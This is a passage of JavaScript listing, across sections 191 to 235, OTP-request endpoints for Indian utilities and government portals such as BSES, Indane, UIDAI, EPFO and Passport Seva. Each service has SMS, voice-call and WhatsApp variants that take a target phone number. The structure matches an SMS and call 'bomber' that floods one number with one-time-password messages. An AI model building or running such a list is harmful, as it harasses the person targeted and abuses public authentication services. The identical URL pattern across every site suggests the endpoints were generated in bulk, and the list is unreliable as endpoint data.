  { name: "Adani Electricity WhatsApp", url: "https://adanielectricity.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 191: ELECTRICITY - BSES
  // ═══════════════════════════════════════════════════════════════
  { name: "BSES SMS", url: "https://www.bsesdelhi.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "BSES Call", url: "https://www.bsesdelhi.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "BSES WhatsApp", url: "https://bsesdelhi.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 192: ELECTRICITY - TPDDL
  // ═══════════════════════════════════════════════════════════════
  { name: "TPDDL SMS", url: "https://www.tpddl.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "TPDDL Call", url: "https://www.tpddl.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "TPDDL WhatsApp", url: "https://tpddl.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 193: ELECTRICITY - TORRENT POWER
  // ═══════════════════════════════════════════════════════════════
  { name: "Torrent Power SMS", url: "https://www.torrentpower.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Torrent Power Call", url: "https://www.torrentpower.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Torrent Power WhatsApp", url: "https://torrentpower.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 194: ELECTRICITY - UPPCL
  // ═══════════════════════════════════════════════════════════════
  { name: "UPPCL SMS", url: "https://www.uppcl.org/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "UPPCL Call", url: "https://www.uppcl.org/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "UPPCL WhatsApp", url: "https://uppcl.org/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 195: ELECTRICITY - MSEB
  // ═══════════════════════════════════════════════════════════════
  { name: "MSEB SMS", url: "https://www.mahadiscom.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MSEB Call", url: "https://www.mahadiscom.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MSEB WhatsApp", url: "https://mahadiscom.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 196: ELECTRICITY - GESCOM
  // ═══════════════════════════════════════════════════════════════
  { name: "GESCOM SMS", url: "https://www.gescom.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "GESCOM Call", url: "https://www.gescom.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "GESCOM WhatsApp", url: "https://gescom.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 197: ELECTRICITY - BESCOM
  // ═══════════════════════════════════════════════════════════════
  { name: "BESCOM SMS", url: "https://www.bescom.org/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "BESCOM Call", url: "https://www.bescom.org/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "BESCOM WhatsApp", url: "https://bescom.org/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 198: ELECTRICITY - CESC
  // ═══════════════════════════════════════════════════════════════
  { name: "CESC SMS", url: "https://www.cesc.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "CESC Call", url: "https://www.cesc.co.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "CESC WhatsApp", url: "https://cesc.co.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 199: ELECTRICITY - WBSEDCL
  // ═══════════════════════════════════════════════════════════════
  { name: "WBSEDCL SMS", url: "https://www.wbsedcl.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "WBSEDCL Call", url: "https://www.wbsedcl.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "WBSEDCL WhatsApp", url: "https://wbsedcl.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 200: GAS - GUJARAT GAS
  // ═══════════════════════════════════════════════════════════════
  { name: "Gujarat Gas SMS", url: "https://www.gujaratgas.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Gujarat Gas Call", url: "https://www.gujaratgas.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Gujarat Gas WhatsApp", url: "https://gujaratgas.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 201: GAS - MAHANAGAR GAS
  // ═══════════════════════════════════════════════════════════════
  { name: "Mahanagar Gas SMS", url: "https://www.mahanagargas.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Mahanagar Gas Call", url: "https://www.mahanagargas.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Mahanagar Gas WhatsApp", url: "https://mahanagargas.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 202: GAS - INDRAPRASTHA GAS
  // ═══════════════════════════════════════════════════════════════
  { name: "Indraprastha Gas SMS", url: "https://www.iglonline.net/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Indraprastha Gas Call", url: "https://www.iglonline.net/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Indraprastha Gas WhatsApp", url: "https://iglonline.net/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 203: GAS - HP GAS
  // ═══════════════════════════════════════════════════════════════
  { name: "HP Gas SMS", url: "https://www.hpgas.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "HP Gas Call", url: "https://www.hpgas.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "HP Gas WhatsApp", url: "https://hpgas.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 204: GAS - BHARAT GAS
  // ═══════════════════════════════════════════════════════════════
  { name: "Bharat Gas SMS", url: "https://www.bharatgas.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Bharat Gas Call", url: "https://www.bharatgas.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Bharat Gas WhatsApp", url: "https://bharatgas.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 205: GAS - INDANE
  // ═══════════════════════════════════════════════════════════════
  { name: "Indane SMS", url: "https://www.indane.co.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Indane Call", url: "https://www.indane.co.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Indane WhatsApp", url: "https://indane.co.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 206: WATER - DELHI JAL BOARD
  // ═══════════════════════════════════════════════════════════════
  { name: "Delhi Jal Board SMS", url: "https://www.delhijalboard.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Delhi Jal Board Call", url: "https://www.delhijalboard.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Delhi Jal Board WhatsApp", url: "https://delhijalboard.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 207: WATER - MCGM
  // ═══════════════════════════════════════════════════════════════
  { name: "MCGM SMS", url: "https://portal.mcgm.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MCGM Call", url: "https://portal.mcgm.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MCGM WhatsApp", url: "https://portal.mcgm.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 208: WATER - CHENNAI METRO WATER
  // ═══════════════════════════════════════════════════════════════
  { name: "Chennai Metro Water SMS", url: "https://www.chennaimetrowater.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Chennai Metro Water Call", url: "https://www.chennaimetrowater.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Chennai Metro Water WhatsApp", url: "https://chennaimetrowater.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 209: WATER - BWSSB
  // ═══════════════════════════════════════════════════════════════
  { name: "BWSSB SMS", url: "https://www.bwssb.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "BWSSB Call", url: "https://www.bwssb.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "BWSSB WhatsApp", url: "https://bwssb.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 210: WATER - PHED RAJASTHAN
  // ═══════════════════════════════════════════════════════════════
  { name: "PHED Rajasthan SMS", url: "https://phed.rajasthan.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PHED Rajasthan Call", url: "https://phed.rajasthan.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PHED Rajasthan WhatsApp", url: "https://phed.rajasthan.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 211: WATER - UPSMD
  // ═══════════════════════════════════════════════════════════════
  { name: "UPSMD SMS", url: "https://upsmd.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "UPSMD Call", url: "https://upsmd.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "UPSMD WhatsApp", url: "https://upsmd.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 212: WATER - KERALA WATER AUTHORITY
  // ═══════════════════════════════════════════════════════════════
  { name: "Kerala Water Authority SMS", url: "https://www.kwa.kerala.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Kerala Water Authority Call", url: "https://www.kwa.kerala.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Kerala Water Authority WhatsApp", url: "https://kwa.kerala.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 213: WATER - PHED PUNJAB
  // ═══════════════════════════════════════════════════════════════
  { name: "PHED Punjab SMS", url: "https://phed.punjab.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PHED Punjab Call", url: "https://phed.punjab.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PHED Punjab WhatsApp", url: "https://phed.punjab.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 214: WATER - HP JAL SHAKTI
  // ═══════════════════════════════════════════════════════════════
  { name: "HP Jal Shakti SMS", url: "https://jalashakti.hp.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "HP Jal Shakti Call", url: "https://jalashakti.hp.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "HP Jal Shakti WhatsApp", url: "https://jalashakti.hp.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 215: WATER - JAL JEEVAN MISSION
  // ═══════════════════════════════════════════════════════════════
  { name: "Jal Jeevan Mission SMS", url: "https://jaljeevanmission.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Jal Jeevan Mission Call", url: "https://jaljeevanmission.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Jal Jeevan Mission WhatsApp", url: "https://jaljeevanmission.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 216: GOVERNMENT - SWACHH BHARAT
  // ═══════════════════════════════════════════════════════════════
  { name: "Swachh Bharat SMS", url: "https://swachhbharatmission.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Swachh Bharat Call", url: "https://swachhbharatmission.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Swachh Bharat WhatsApp", url: "https://swachhbharatmission.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 217: GOVERNMENT - PMAY
  // ═══════════════════════════════════════════════════════════════
  { name: "PMAY SMS", url: "https://pmaymis.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PMAY Call", url: "https://pmaymis.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PMAY WhatsApp", url: "https://pmaymis.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 218: GOVERNMENT - NHAI
  // ═══════════════════════════════════════════════════════════════
  { name: "NHAI SMS", url: "https://nhai.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "NHAI Call", url: "https://nhai.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "NHAI WhatsApp", url: "https://nhai.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 219: GOVERNMENT - EPFO
  // ═══════════════════════════════════════════════════════════════
  { name: "EPFO SMS", url: "https://www.epfindia.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "EPFO Call", url: "https://www.epfindia.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "EPFO WhatsApp", url: "https://epfindia.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 220: GOVERNMENT - ESIC
  // ═══════════════════════════════════════════════════════════════
  { name: "ESIC SMS", url: "https://www.esic.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "ESIC Call", url: "https://www.esic.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "ESIC WhatsApp", url: "https://esic.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 221: GOVERNMENT - INCOME TAX
  // ═══════════════════════════════════════════════════════════════
  { name: "Income Tax SMS", url: "https://www.incometax.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Income Tax Call", url: "https://www.incometax.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Income Tax WhatsApp", url: "https://incometax.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 222: GOVERNMENT - GST PORTAL
  // ═══════════════════════════════════════════════════════════════
  { name: "GST Portal SMS", url: "https://www.gst.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "GST Portal Call", url: "https://www.gst.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "GST Portal WhatsApp", url: "https://gst.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 223: GOVERNMENT - MCA21
  // ═══════════════════════════════════════════════════════════════
  { name: "MCA21 SMS", url: "https://www.mca.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MCA21 Call", url: "https://www.mca.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MCA21 WhatsApp", url: "https://mca.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 224: GOVERNMENT - PASSPORT SEVA
  // ═══════════════════════════════════════════════════════════════
  { name: "Passport Seva SMS", url: "https://portal2.passportindia.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Passport Seva Call", url: "https://portal2.passportindia.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Passport Seva WhatsApp", url: "https://portal2.passportindia.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 225: GOVERNMENT - VOTER ID
  // ═══════════════════════════════════════════════════════════════
  { name: "Voter ID SMS", url: "https://www.nvsp.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Voter ID Call", url: "https://www.nvsp.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Voter ID WhatsApp", url: "https://nvsp.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 226: GOVERNMENT - AADHAAR
  // ═══════════════════════════════════════════════════════════════
  { name: "Aadhaar SMS", url: "https://uidai.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Aadhaar Call", url: "https://uidai.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Aadhaar WhatsApp", url: "https://uidai.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 227: GOVERNMENT - PAN CARD
  // ═══════════════════════════════════════════════════════════════
  { name: "PAN Card SMS", url: "https://www.protean-tinpan.com/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "PAN Card Call", url: "https://www.protean-tinpan.com/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "PAN Card WhatsApp", url: "https://protean-tinpan.com/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 228: GOVERNMENT - DRIVING LICENSE
  // ═══════════════════════════════════════════════════════════════
  { name: "Driving License SMS", url: "https://parivahan.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Driving License Call", url: "https://parivahan.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Driving License WhatsApp", url: "https://parivahan.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 229: GOVERNMENT - VEHICLE REGISTRATION
  // ═══════════════════════════════════════════════════════════════
  { name: "Vehicle Registration SMS", url: "https://vahan.parivahan.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "Vehicle Registration Call", url: "https://vahan.parivahan.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "Vehicle Registration WhatsApp", url: "https://vahan.parivahan.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 230: GOVERNMENT - DIGILOCKER
  // ═══════════════════════════════════════════════════════════════
  { name: "DigiLocker SMS", url: "https://www.digilocker.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "DigiLocker Call", url: "https://www.digilocker.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "DigiLocker WhatsApp", url: "https://digilocker.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 231: GOVERNMENT - UMANG
  // ═══════════════════════════════════════════════════════════════
  { name: "UMANG SMS", url: "https://umang.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "UMANG Call", url: "https://umang.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "UMANG WhatsApp", url: "https://umang.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 232: GOVERNMENT - CSC
  // ═══════════════════════════════════════════════════════════════
  { name: "CSC SMS", url: "https://www.csc.gov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "CSC Call", url: "https://www.csc.gov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "CSC WhatsApp", url: "https://csc.gov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 233: GOVERNMENT - NIC
  // ═══════════════════════════════════════════════════════════════
  { name: "NIC SMS", url: "https://www.nic.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "NIC Call", url: "https://www.nic.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "NIC WhatsApp", url: "https://nic.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 234: GOVERNMENT - MYGOV
  // ═══════════════════════════════════════════════════════════════
  { name: "MyGov SMS", url: "https://www.mygov.in/api/v1/otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobile: p}) },
  { name: "MyGov Call", url: "https://www.mygov.in/api/v1/voice-otp", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({phone: p}) },
  { name: "MyGov WhatsApp", url: "https://mygov.in/gw/login-register/v1/sendOTP", method: "POST", headers: {"Content-Type": "application/json"}, data: (p) => JSON.stringify({mobileNumber: p}) },

  // ═══════════════════════════════════════════════════════════════
  // SECTION 235: GOVERNMENT - CPGRAMS
  // ═══════════════════════════════════════════════════════════════
